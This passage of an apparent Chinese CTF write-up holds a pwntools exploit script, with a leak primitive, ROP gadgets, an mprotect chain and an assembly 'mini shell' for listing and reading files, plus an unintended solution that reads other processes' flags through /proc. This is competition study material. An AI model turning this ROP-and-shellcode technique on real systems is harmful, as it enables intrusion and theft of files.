style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    leak </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">high </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 32</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">low</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> leak</span><br><br><br><span style="color:#758575DD"># 0xc00140c1e0</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">How large is your inventory?</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">4000000000000000</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 1</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">check</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">leak1 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> read64</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">c000012070</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">6a8</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"leak1 => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">leak1</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># steal(0, b"Los 67")</span><br><span style="color:#758575DD"># pause()</span><br><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">leak1 </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">490</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> leak1 </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">6a8</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 8</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    tmp </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> read64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"</span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">: tmp => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">tmp</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">tmp </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 36</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> ==</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7ff</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        stack_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> tmp</span><br><span style="color:#4D9375">        break</span><br><br><span style="color:#758575DD"># ead64(leak1)</span><br><span style="color:#DBD7CAEE">stack_addr </span><span style="color:#666666">+=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">a8</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"stack_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">stack_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">pop_rdi_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000000647a5f</span><br><span style="color:#DBD7CAEE">pop_rsi_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000064a120</span><br><span style="color:#DBD7CAEE">pop_rdx_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000000662b1a</span><br><span style="color:#DBD7CAEE">pop_rax_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000000662865</span><br><span style="color:#DBD7CAEE">syscall </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000000661ba0</span><br><span style="color:#DBD7CAEE">binsh </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">c003fffc00</span><br><span style="color:#DBD7CAEE">pop_rax_rbx_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000064fcaa</span><br><span style="color:#B8A965">dir</span><span style="color:#666666"> =</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">c003fffc50</span><br><span style="color:#DBD7CAEE">flag_name </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">c003fff12f</span><br><span style="color:#DBD7CAEE">ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pop_rax_ret </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><br><span style="color:#DBD7CAEE">push_rax_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000062db0c</span><br><br><span style="color:#DBD7CAEE">reread </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stack_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">50</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">500</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ret</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">rop </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stack_addr </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">fffffffffffff000</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">1000</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 7</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rax_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 10</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stack_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">a0</span><span style="color:#5eaab5">]</span><br><br><span style="color:#DBD7CAEE">mini_shell </span><span style="color:#666666">=</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">"""</span><br><span style="color:#C98A7D">entry:</span><br><span style="color:#C98A7D">    lea rsp,[rip - 0x7]</span><br><span style="color:#C98A7D">    mov rsp, </span><span style="color:#5eaab5">{</span><span style="color:#DBD7CAEE">stack_addr </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">968</span><span style="color:#5eaab5">}</span><br><span style="color:#C98A7D">    call mini_shell</span><br><span style="color:#C98A7D">/* void gets(char*buffer) */</span><br><span style="color:#C98A7D">gets:</span><br><span style="color:#C98A7D">    push rbp</span><br><span style="color:#C98A7D">    mov rbp,rsp</span><br><br><span style="color:#C98A7D">    push rdi                    /*gets buffer*/</span><br><span style="color:#C98A7D">    push 0x0                    /*temp buff*/</span><br><span style="color:#C98A7D">readByte:</span><br><span style="color:#C98A7D">    xor rdi,rdi</span><br><span style="color:#C98A7D">    lea rsi,[rsp]               /*read one byte to buffer*/</span><br><span style="color:#C98A7D">    mov rdx,1</span><br><br><span style="color:#C98A7D">    xor rax,rax</span><br><span style="color:#C98A7D">    syscall</span><br><br><span style="color:#C98A7D">    cmp rax,1</span><br><span style="color:#C98A7D">    jne  error</span><br><br><span style="color:#C98A7D">    cmp byte ptr[rsp],0xa</span><br><span style="color:#C98A7D">    je getsend</span><br><span style="color:#C98A7D">    mov al,byte ptr[rsp]</span><br><br><span style="color:#C98A7D">    mov rdi,rsp</span><br><span style="color:#C98A7D">    add rdi,0x8</span><br><span style="color:#C98A7D">    mov rdi,[rdi]</span><br><br><span style="color:#C98A7D">    mov byte ptr [rdi], al</span><br><br><span style="color:#C98A7D">    inc rdi</span><br><span style="color:#C98A7D">    mov [rsp + 0x8],rdi         /*rdi++*/</span><br><span style="color:#C98A7D">    jmp readByte</span><br><br><span style="color:#C98A7D">getsend:</span><br><span style="color:#C98A7D">    mov rdi,[rsp + 0x8]</span><br><span style="color:#C98A7D">    mov byte ptr [rdi],0</span><br><span style="color:#C98A7D">error:</span><br><span style="color:#C98A7D">    leave</span><br><span style="color:#C98A7D">    ret</span><br><br><span style="color:#C98A7D">/* void print(char*string) */</span><br><span style="color:#C98A7D">print:</span><br><span style="color:#C98A7D">    push rbp</span><br><span style="color:#C98A7D">    mov rbp,rsp</span><br><span style="color:#C98A7D">    push rdi</span><br><br><span style="color:#C98A7D">    call strlen</span><br><span style="color:#C98A7D">    mov rdx,rax</span><br><span style="color:#C98A7D">    mov rdi,1</span><br><span style="color:#C98A7D">    mov rsi,[rsp]</span><br><br><span style="color:#C98A7D">    mov rax,1</span><br><span style="color:#C98A7D">    syscall</span><br><span style="color:#C98A7D">    leave</span><br><span style="color:#C98A7D">    ret</span><br><span style="color:#C98A7D">/* int strlen(const char*s) */</span><br><span style="color:#C98A7D">strlen:</span><br><span style="color:#C98A7D">    push rbx</span><br><span style="color:#C98A7D">    xor rax,rax</span><br><br><span style="color:#C98A7D">    test rdi,rdi</span><br><span style="color:#C98A7D">    je end</span><br><span style="color:#C98A7D">loop:</span><br><span style="color:#C98A7D">    mov bl,byte ptr [rdi]</span><br><span style="color:#C98A7D">    test bl,bl</span><br><span style="color:#C98A7D">    je end</span><br><span style="color:#C98A7D">    inc rax</span><br><span style="color:#C98A7D">    inc rdi</span><br><span style="color:#C98A7D">    jmp loop</span><br><span style="color:#C98A7D">end:</span><br><span style="color:#C98A7D">    pop rbx</span><br><span style="color:#C98A7D">    ret</span><br><br><span style="color:#C98A7D">/* void cat(const char*filepath)*/</span><br><span style="color:#C98A7D">cat:</span><br><span style="color:#C98A7D">    push r8</span><br><span style="color:#C98A7D">    push rbp</span><br><span style="color:#C98A7D">    mov rbp,rsp</span><br><br><span style="color:#C98A7D">    /* buffer */</span><br><span style="color:#C98A7D">    sub rsp,0x100</span><br><br><span style="color:#C98A7D">    /* open file */</span><br><span style="color:#C98A7D">    xor rcx,rcx</span><br><span style="color:#C98A7D">    mov rsi,rdi</span><br><span style="color:#C98A7D">    xor rdx,rdx</span><br><span style="color:#C98A7D">    mov edi,0xFFFFFF9C</span><br><span style="color:#C98A7D">    call sys_openat2</span><br><br><span style="color:#C98A7D">    cmp rax,-1</span><br><span style="color:#C98A7D">    je open_failed</span><br><span style="color:#C98A7D">    mov r8,rax</span><br><span style="color:#C98A7D">/* loop of read*/</span><br><span style="color:#C98A7D">loop_read:</span><br><span style="color:#C98A7D">    mov rdi,r8</span><br><span style="color:#C98A7D">    mov rsi,rsp</span><br><span style="color:#C98A7D">    mov rdx,0x100</span><br><br><span style="color:#C98A7D">    xor rax,rax</span><br><span style="color:#C98A7D">    syscall</span><br><br><span style="color:#C98A7D">    cmp rax,0</span><br><span style="color:#C98A7D">    /* read eof or failed*/</span><br><span style="color:#C98A7D">    jle open_failed</span><br><br><span style="color:#C98A7D">    mov rdi,1</span><br><span style="color:#C98A7D">    mov rsi,rsp</span><br><span style="color:#C98A7D">    mov rdx,rax</span><br><br><span style="color:#C98A7D">    mov rax,1</span><br><span style="color:#C98A7D">    syscall</span><br><br><span style="color:#C98A7D">    jmp loop_read</span><br><span style="color:#C98A7D">open_failed:</span><br><span style="color:#C98A7D">    leave</span><br><span style="color:#C98A7D">    pop r8</span><br><span style="color:#C98A7D">    ret</span><br><br><span style="color:#C98A7D">/* void ls(const char*dir) */</span><br><span style="color:#C98A7D">ls:</span><br><span style="color:#C98A7D">    push r8</span><br><span style="color:#C98A7D">    push rbp</span><br><span style="color:#C98A7D">    mov rbp,rsp</span><br><span style="color:#C98A7D">    /* buffer */</span><br><span style="color:#C98A7D">    sub rsp,0x200</span><br><br><br><span style="color:#C98A7D">    xor rcx,rcx</span><br><span style="color:#C98A7D">    mov rdx,65536</span><br><span style="color:#C98A7D">    mov rsi,rdi</span><br><span style="color:#C98A7D">    mov edi,0xFFFFFF9C</span><br><span style="color:#C98A7D">    call sys_openat2</span><br><br><span style="color:#C98A7D">    cmp rax,-1</span><br><span style="color:#C98A7D">    je ls_failed</span><br><br><span style="color:#C98A7D">    mov r8,rax</span><br><span style="color:#C98A7D">/* loop read dir */</span><br><span style="color:#C98A7D">loop_read_dir:</span><br><span style="color:#C98A7D">    mov rdi,r8</span><br><span style="color:#C98A7D">    mov rsi,rsp</span><br><span style="color:#C98A7D">    mov rdx,0x200</span><br><br><span style="color:#C98A7D">    mov rax,78</span><br><span style="color:#C98A7D">    syscall</span><br><br><span style="color:#C98A7D">    cmp rax,0</span><br><span style="color:#C98A7D">    jle ls_failed</span><br><br><span style="color:#C98A7D">    /* r9: nRead */</span><br><span style="color:#C98A7D">    mov r9,rax</span><br><br><span style="color:#C98A7D">    /* show infos in buffer */</span><br><span style="color:#C98A7D">    xor rcx,rcx</span><br><span style="color:#C98A7D">show_file_in_buffer:</span><br><span style="color:#C98A7D">    lea rdi,[rsp + rcx + 16]</span><br><span style="color:#C98A7D">    xor rax,rax</span><br><span style="color:#C98A7D">    mov ax,word ptr [rdi]</span><br><span style="color:#C98A7D">    add rcx,rax</span><br><span style="color:#C98A7D">    add rdi,2</span><br><span style="color:#C98A7D">    push rcx</span><br><span style="color:#C98A7D">    call print</span><br><br><span style="color:#C98A7D">    /* dir of regular file*/</span><br><span style="color:#C98A7D">    mov rcx,[rsp]</span><br><br><span style="color:#C98A7D">    mov al,byte ptr [rsp + rcx + 7]</span><br><span style="color:#C98A7D">    cmp al,0x4</span><br><span style="color:#C98A7D">    mov rax,0xa</span><br><span style="color:#C98A7D">    mov rdx,1</span><br><span style="color:#C98A7D">    jne out_split_char</span><br><span style="color:#C98A7D">    / * out char '/' */</span><br><span style="color:#C98A7D">    mov rax,0xa2f</span><br><span style="color:#C98A7D">    inc rdx</span><br><span style="color:#C98A7D">out_split_char:</span><br><span style="color:#C98A7D">    push rax</span><br><span style="color:#C98A7D">    mov rdi,1</span><br><span style="color:#C98A7D">    mov rsi,rsp</span><br><br><span style="color:#C98A7D">    mov rax,1</span><br><span style="color:#C98A7D">    syscall</span><br><span style="color:#C98A7D">    add rsp,8</span><br><span style="color:#C98A7D">    pop rcx</span><br><span style="color:#C98A7D">    cmp rcx,r9</span><br><br><span style="color:#C98A7D">    jb show_file_in_buffer</span><br><br><span style="color:#C98A7D">    /* all file in buffer has been listed */</span><br><span style="color:#C98A7D">    jmp loop_read_dir</span><br><br><span style="color:#C98A7D">ls_failed:</span><br><span style="color:#C98A7D">    leave</span><br><span style="color:#C98A7D">    pop r8</span><br><span style="color:#C98A7D">    ret</span><br><br><span style="color:#C98A7D">mini_shell:</span><br><span style="color:#C98A7D">    sub rsp,0x200</span><br><span style="color:#C98A7D">    mov dword ptr[rsp],0x242f</span><br><span style="color:#C98A7D">loop_exec_cmd:</span><br><span style="color:#C98A7D">    /* show current work dir*/</span><br><span style="color:#C98A7D">    mov rdi,rsp</span><br><span style="color:#C98A7D">    call print</span><br><span style="color:#C98A7D">    /* get user's command */</span><br><span style="color:#C98A7D">    lea rdi,[rsp + 0x100]</span><br><span style="color:#C98A7D">    call gets</span><br><span style="color:#C98A7D">    /* switch command */</span><br><span style="color:#C98A7D">if_ls:</span><br><span style="color:#C98A7D">    mov eax,[rsp + 0x100]</span><br><span style="color:#C98A7D">    and eax,0x00ffffff</span><br><span style="color:#C98A7D">    cmp eax,0x20736c</span><br><span style="color:#C98A7D">    jne if_cat</span><br><br><span style="color:#C98A7D">    lea rdi,[rsp + 0x103]</span><br><span style="color:#C98A7D">    call ls</span><br><span style="color:#C98A7D">    jmp loop_exec_cmd</span><br><span style="color:#C98A7D">if_cat:</span><br><span style="color:#C98A7D">    mov eax,[rsp + 0x100]</span><br><span style="color:#C98A7D">    and eax,0xffffffff</span><br><span style="color:#C98A7D">    cmp eax,0x20746163</span><br><span style="color:#C98A7D">    jne loop_exec_cmd</span><br><br><span style="color:#C98A7D">    lea rdi,[rsp + 0x104]</span><br><span style="color:#C98A7D">    call cat</span><br><span style="color:#C98A7D">    jmp loop_exec_cmd</span><br><br><span style="color:#C98A7D">    /* dfd,filename,flag,mode */</span><br><span style="color:#C98A7D">sys_openat2:</span><br><span style="color:#C98A7D">    push r10</span><br><span style="color:#C98A7D">    sub rsp,0x18</span><br><br><span style="color:#C98A7D">    xor rax,rax</span><br><span style="color:#C98A7D">    /*how */</span><br><span style="color:#C98A7D">    mov [rsp + 0x0],rdx</span><br><span style="color:#C98A7D">    mov [rsp + 0x8],rcx</span><br><span style="color:#C98A7D">    mov [rsp + 0x10],rax</span><br><span style="color:#C98A7D">    lea rdx,[rsp]</span><br><br><span style="color:#C98A7D">    /* size */</span><br><span style="color:#C98A7D">    push 0x18</span><br><span style="color:#C98A7D">    pop r10</span><br><br><span style="color:#C98A7D">    mov rax, SYS_openat2</span><br><span style="color:#C98A7D">    syscall</span><br><br><span style="color:#C98A7D">    add rsp,0x18</span><br><span style="color:#C98A7D">    pop r10</span><br><span style="color:#C98A7D">    ret</span><br><br><span style="color:#C98A7D">sys_openat:</span><br><span style="color:#C98A7D">    push r10</span><br><span style="color:#C98A7D">    mov r10,rcx</span><br><span style="color:#C98A7D">    mov rax, SYS_openat</span><br><span style="color:#C98A7D">    syscall</span><br><span style="color:#C98A7D">    pop r10</span><br><span style="color:#C98A7D">    ret</span><br><span style="color:#C98A7D">"""</span><br><br><span style="color:#DBD7CAEE">orw </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">orw</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">src </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">6348d6</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stack_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">50</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">662343</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">66231b</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">624ba6</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">]</span><br><br><span style="color:#DBD7CAEE">write64</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">c003fffc00</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">6873</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">write64</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">dir</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">2f2e2e</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">reread</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    write64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">stack_addr </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> i </span><span style="color:#CB7676">*</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reread</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> src</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"stack_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">stack_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">flat</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">rop</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">mini_shell</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="quintuple-read" class="scroll-target"><a href="#quintuple-read"><code class="hash inline-code">#</code>quintuple-read</a></h2>
<p>小众变态题目，牢完了。</p>
<p>题意很简单，要求用五种完全不同的字节集实现读取 flag.txt，我搓 orw 搓了三个半，分别是：</p>
<ol>
<li>stage A: 0~0x1f 用<a href="https://www.anquanke.com/post/id/256530" title="https://www.anquanke.com/post/id/256530" target="_blank" rel="noopener">这篇文章</a>提到的技术</li>
<li>stage B: 用 <code class="inline-code">mov rdi, rdx</code> + <code class="inline-code">stosb</code></li>
<li>stage C: 只使用 <code class="inline-code">push</code> <code class="inline-code">pop</code></li>
<li>stage D：搓不动了.jpg</li>
</ol>
<p>太牢了我日，受不了，考虑非预期。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">while</span><span style="color:#1E754F"> True</span><span style="color:#999999">:</span><br><span style="color:#1E754F">   for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 100000</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">      read</span><span style="color:#2993a3">(</span><span style="color:#998418">open</span><span style="color:#1e754f">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"/proc/</span><span style="color:#a65e2b">{</span><span style="color:#393A34">i</span><span style="color:#a65e2b">}</span><span style="color:#B56959">/cwd/flag"</span><span style="color:#999999">,</span><span style="color:#A65E2B"> O_RDONLY</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">rsp</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">      write</span><span style="color:#2993a3">(</span><span style="color:#998418">open</span><span style="color:#1e754f">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"/proc/</span><span style="color:#a65e2b">{</span><span style="color:#393A34">i</span><span style="color:#a65e2b">}</span><span style="color:#B56959">/fd/1"</span><span style="color:#999999">,</span><span style="color:#A65E2B"> O_WRONLY</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">rsp</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">while</span><span style="color:#4D9375"> True</span><span style="color:#666666">:</span><br><span style="color:#4D9375">   for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 100000</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">      read</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">open</span><span style="color:#4d9375">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"/proc/</span><span style="color:#d4976c">{</span><span style="color:#DBD7CAEE">i</span><span style="color:#d4976c">}</span><span style="color:#C98A7D">/cwd/flag"</span><span style="color:#666666">,</span><span style="color:#C99076"> O_RDONLY</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">rsp</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">100</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">      write</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">open</span><span style="color:#4d9375">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"/proc/</span><span style="color:#d4976c">{</span><span style="color:#DBD7CAEE">i</span><span style="color:#d4976c">}</span><span style="color:#C98A7D">/fd/1"</span><span style="color:#666666">,</span><span style="color:#C99076"> O_WRONLY</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">rsp</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">100</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<p>题目的权限没配置好，不同进程的用户都是同一个，可以跨进程读文件。</p>
<p>那就设置两个进程 A、B，其中 A 进程只需要保持 1 ~ 2s 的睡眠，B 进程在这段时间内遍历 <code class="inline-code">pid</code> 然后读取 <code class="inline-code">/proc/{i}/cwd/flag</code></p>
<p>显然要先启动 A 再启动 B，不然只会读取到 B 进程的 flag 就退出了。</p>
<p>重复五次上述操作，就可以 leak 5 个 flag 碎片出来。所以只需要用五种不同的字符集实现 <code class="inline-code">sleep</code> 就行了，具体就是用一些有限次数的循环来实现。</p>
